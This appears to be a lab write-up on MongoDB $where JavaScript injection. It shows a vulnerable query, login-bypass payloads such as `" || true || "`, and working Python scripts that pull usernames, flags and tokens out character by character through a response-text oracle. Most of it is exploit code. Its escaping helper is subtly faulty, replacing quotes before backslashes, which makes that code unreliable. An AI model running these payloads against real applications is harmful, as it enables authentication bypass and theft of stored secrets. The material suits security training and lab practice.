# Server-Side JavaScript Injection (SSJI) via $where

MongoDB's `$where` operator executes a JavaScript expression to filter documents. If user input is concatenated directly into the expression string, you can inject arbitrary JS and turn the query into a boolean oracle.

---

## The Vulnerable Pattern

```javascript
db.users.find({
    $where: 'this.username === "' + username + '" && this.password === "' + password + '"'
})
```

Passing `" || true || "` as the username closes the string and injects an always-true expression:
```javascript
this.username === "" || true || "" && this.password === "..."
```

The `||` short-circuits so the whole expression is `true`. Any document in the collection is returned.

---

## Building a Boolean Oracle

The most reliable oracle is a difference in the response body, not HTTP status. In the MangoOnline lab:

| Outcome | Response |
|---------|----------|
| Query matched a document | `Login successful but the site is temporarily down...` |
| No match | `Login failed!` |

The "maintenance mode" message is actually useful — the site never lets you in, but the query still runs and the difference in response text is the oracle.

**Verify the oracle first:**
```python
def query(username, password="x"):
    r = requests.post(TARGET, data={"username": username, "password": password})
    return "Login successful" in r.text

# Sanity checks:
print(query('" || true || "'))   # True  — always matches
print(query('" && false || "'))  # False — always misses
print(query('bmdyy'))            # True  — known-good username
```

---

## Brute-Forcing Field Values

Once you have a boolean oracle, you can extract any string field char by char using `match()` or `charCodeAt()`:

### Method 1: regex prefix matching
```js
// In $where context — does username start with "HTB{A"?
this.username.match("^HTB\\{A.*")
```

Username payload:
```
" || (this.username.match("^HTB\\{A.*")) || ""=="
```

Resulting `$where` expression:
```javascript
this.username === "" || (this.username.match("^HTB{A.*")) || ""==""
&& this.password === "x"
```

Python brute loop:
```python
import string, requests

TARGET = "http://TARGET/index.php"

def oracle(prefix):
    escaped = prefix.replace('"', '\\"').replace('\\', '\\\\')
    payload = f'" || (this.username.match("^{escaped}.*")) || ""=="'
    r = requests.post(TARGET, data={"username": payload, "password": "x"})
    return "Login successful" in r.text

known = "HTB{"
charset = string.ascii_letters + string.digits + "_{}"
while True:
    found = False
    for c in charset:
        if oracle(known + c):
            known += c
            print(f"[+] {known}")
            found = True
            break
    if not found:
        break
print("Result:", known)
```

### Method 2: charCodeAt binary search (faster, fewer requests)
```python
def oracle_char(idx, code, op="=="):
    payload = f'" || (this.username.charCodeAt({idx}) {op} {code}) || ""=="'
    r = requests.post(TARGET, data={"username": payload, "password": "x"})
    return "Login successful" in r.text

def brute_char(idx):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle_char(idx, mid, ">"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if oracle_char(idx, lo) else None
```

The binary-search approach uses ~7 requests per character vs. ~50 for linear scan.

---

## Extracting Non-password Fields

If you want to extract a field other than `username`, adapt the predicate:
```js
this.username == "bmdyy" && this.token.charCodeAt(0) == 56
```

This is how the MangoFile token leak works — first confirm the user exists (`this.username == "bmdyy"`), then binary-search each character of `token`.

---

## Key Points

- `$where` injection requires the server to run MongoDB with JavaScript enabled (it's off by default in newer deployments — but older apps often have it on).
- Case sensitivity: MongoDB's `match()` with a plain regex is case-sensitive. `charCodeAt()` is always case-sensitive.
- The SSJI oracle only works if the app returns a different response for "query matched" vs. "query didn't match". If it's always the same page, look for timing differences or try error-based injection.
- Regex special characters (`{`, `}`, `.`, `*`, `\`) must be escaped in the match string. Double-escape `\` when going through Python string formatting.
